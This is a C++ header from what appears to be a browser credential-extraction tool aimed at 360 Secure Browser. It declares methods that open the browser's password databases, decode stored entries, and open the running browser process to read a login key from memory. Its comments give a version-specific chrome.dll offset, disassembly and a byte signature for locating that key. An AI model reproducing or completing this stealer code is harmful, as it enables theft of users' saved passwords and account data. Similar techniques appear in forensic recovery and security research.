#pragma once

#include "UnCode.h"
#include<Tlhelp32.h>




#define BROWSER_360_SUCCESS					0
#define BROWSER_360_UNKNOW_FAILED			1
#define BROWSER_360SE_PROC_NOT_FIND			2
#define BROWSER_OFFSET_GET_NULL				3
#define BROWSER_360SE_PROCOPEN_FAILED		4
#define BROWSER_360SE_SQLITE_PREPARE_FAILED	5
#define BROWSER_360SE_SQLITE_OPEN_FAILED    6
#define BROWSER_360SE_GUID_GET_FAILED		7
#define BROWSER_360SE_REG_PATH_FAILED		8

// 登录用户支持的版本 13.1.1438.0 20210701

class Get360seInfo
{
public:
	Get360seInfo();
	~Get360seInfo();
	bool getData(std::vector<BrowserData> *pBroData);
private:
	std::string m_str360seFullPath;
	DWORD m_errCode;
	bool isOk;

	// 没有登陆状态下
	bool Open360Database(std::vector<BrowserData> *pBroData);
	std::string Last360Uncode(const char* passItem);
	std::string m_ptrGuid;
	std::string m_ptr360dbPath;



	// 有账户登录状态下
	int offset ; // 版本对应 13.1.1438.0 0x4C91B5

	bool isLogin;
	std::string loginRandKey;
	std::vector<std::string> db4ver;
	void FindLoginDB(std::string lpPath);
	bool OpenLogin360Data(std::vector<BrowserData> *pBroData);

	bool EnumProcessGetRandstr();
	bool EnumChromeRandstr(DWORD th32ProcessID, HANDLE h_360se);


};



//6BB991A9    CC              int3
//6BB991AA    55              push ebp; gdi32ful.75E6056E
//6BB991AB    89E5            mov ebp, esp
//6BB991AD    56              push esi
//6BB991AE    89CE            mov esi, ecx
//6BB991B0    C641 78 00      mov byte ptr ds : [ecx + 0x78], 0x0
//6BB991B4    B9 B4D18472     mov ecx, chrome.7284D1B4	<----	获取该地址
//6BB991B9    68 E8F77D71     push chrome.717DF7E8  <---
//6BB991BE    E8 A5B2B3FF     call chrome.6B6D4468
//6BB991C3    89F1            mov ecx, esi
//6BB991C5    5E              pop esi
//6BB991C6    5D              pop ebp; gdi32ful.75E6056E
//6BB991C7    E9 00000000     jmp chrome.6BB991CC

// 	int offset = 0x4C91B5;
// 这里是特征码的位置 但是因为chorme.dll大小高达 100MB 并且支持的第一个版本 所以采用计算固定偏移的方式
// char code[]{ 0xCC,0x55,0x56,0x89,0xCE,0xC6,0x41,0x78,0x00,0xB9,0xFF,0xFF,0xFF,0xFF,0x68,0xFF,0xFF,0xFF,0xFF,0xE8,0xA5,0xB2,0xB3,0xFF,0x89,0xF1,0x5E,0x5D,0xE9,0x00,0x00,0x00,0x00 };


